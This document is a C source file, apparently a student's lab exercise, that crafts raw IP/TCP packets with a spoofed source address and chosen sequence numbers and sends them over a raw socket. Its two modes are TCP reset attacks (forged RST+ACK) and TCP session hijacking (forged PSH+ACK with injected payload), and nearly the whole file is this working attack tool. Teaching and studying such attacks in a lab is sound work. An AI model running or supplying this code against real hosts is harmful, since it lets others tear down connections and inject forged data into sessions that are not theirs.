#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <stdint.h>

// ----------------------------------------------------
// IP checksum (prof's form) — computes header-only
// ----------------------------------------------------
unsigned short csum_ip(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    while (sum >> 16)
        sum = (sum >> 16) + (sum & 0xFFFF);
    return ~sum;
}

// ----------------------------------------------------
// TCP checksum (prof’s exact algorithm)
// buf = pointer to start of IP header
// nwords = number of 2-byte words in TCP payload only
// ----------------------------------------------------
unsigned short csum_tcp(unsigned short *buf, int nwords) {
    unsigned long sum = 0;

    // IP src, dst = words 6–9 in the buffer
    sum += buf[6];
    sum += buf[7];
    sum += buf[8];
    sum += buf[9];

    sum += htons(6);                     // TCP protocol
    sum += htons(20 + (nwords << 1));    // 20-byte TCP header + payload

    // TCP header starts at buf[10]
    for (int i = 10; i < 20 + nwords; i++)
        sum += buf[i];

    while (sum >> 16)
        sum = (sum >> 16) + (sum & 0xFFFF);

    return ~sum;
}

// ----------------------------------------------------
// Build packet for Attack 2 (RST) and Attack 3 (DATA)
// ----------------------------------------------------
void build_packet(char *packet,
                  char *src_ip, int src_port,
                  char *dst_ip, int dst_port,
                  uint32_t seq, uint32_t ack,
                  char mode, const char *payload)
{
    memset(packet, 0, 4096);

    struct iphdr  *ip  = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

    int payload_len = (payload ? strlen(payload) : 0);

    // ---------------- IP header ----------------
    ip->ihl      = 5;
    ip->version  = 4;
    ip->tos      = 0;
    ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
    ip->id       = htons(54321);
    ip->frag_off = 0;
    ip->ttl      = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr    = inet_addr(src_ip);
    ip->daddr    = inet_addr(dst_ip);
    ip->check    = 0;

    ip->check    = csum_ip((unsigned short *)packet, ip->ihl * 2);

    // ---------------- TCP header ----------------
    tcp->source  = htons(src_port);
    tcp->dest    = htons(dst_port);
    tcp->seq     = htonl(seq);
    tcp->ack_seq = htonl(ack);
    tcp->doff    = 5;
    tcp->window  = htons(65535);
    tcp->urg_ptr = 0;

    // Clear all flags first
    tcp->fin = tcp->syn = tcp->rst =
    tcp->psh = tcp->ack = tcp->urg = 0;

    // Attack 2: RST+ACK
    if (mode == 'R') {
        tcp->rst = 1;
        tcp->ack = 1;
    }

    // Attack 3: PSH+ACK with payload
    if (mode == 'D') {
        tcp->psh = 1;
        tcp->ack = 1;
    }

    // Copy payload
    if (payload_len > 0) {
        memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr),
               payload, payload_len);
    }

    // ---------------- TCP checksum ----------------
    int nwords = (payload_len + 1) / 2;
    tcp->check = 0;
    tcp->check = csum_tcp((unsigned short *)packet, nwords);
}


// ----------------------------------------------------
// main()
// ----------------------------------------------------
int main(int argc, char *argv[])
{
    if (argc < 8) {
        printf("Usage:\n");
        printf("  Attack 2 (RST):  sudo ./attack R <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n");
        printf("  Attack 3 (DATA): sudo ./attack D <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack> <payload>\n");
        return 1;
    }

    char mode = argv[1][0];
    char *src_ip  = argv[2];
    int   src_port = atoi(argv[3]);
    char *dst_ip  = argv[4];
    int   dst_port = atoi(argv[5]);
    uint32_t seq  = strtoul(argv[6], NULL, 10);
    uint32_t ack  = strtoul(argv[7], NULL, 10);
    const char *payload = (argc > 8) ? argv[8] : "";

    char packet[4096];

    build_packet(packet, src_ip, src_port,
                 dst_ip, dst_port,
                 seq, ack,
                 mode, payload);

    // Raw socket
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) {
        perror("socket");
        return 1;
    }

    int one = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        close(s);
        return 1;
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(dst_ip);
    sin.sin_port = htons(dst_port);

    int len = ntohs(((struct iphdr *)packet)->tot_len);

    if (sendto(s, packet, len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        perror("sendto");
        close(s);
        return 1;
    }

    printf("Sent %c packet %s:%d → %s:%d seq=%u ack=%u\n",
           mode, src_ip, src_port, dst_ip, dst_port, seq, ack);

    close(s);
    return 0;
}
